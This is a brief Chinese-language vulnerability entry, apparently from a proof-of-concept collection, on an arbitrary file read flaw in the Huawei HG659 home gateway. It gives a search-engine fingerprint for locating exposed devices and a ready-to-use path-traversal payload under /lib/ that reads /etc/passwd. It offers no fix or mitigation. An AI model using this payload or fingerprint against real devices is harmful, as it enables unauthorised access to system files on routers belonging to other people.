# Huawei HG659 lib 任意文件读取漏洞

## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

<a-checkbox checked>Huawei HG659</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="HUAWEI-Home-Gateway-HG659"</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/image-20210615141459903.png)



POC如下



```plain
/lib///....//....//....//....//....//....//....//....//etc//passwd
```



![img](../../../.vuepress/public/img/image-20210615141751249.png)

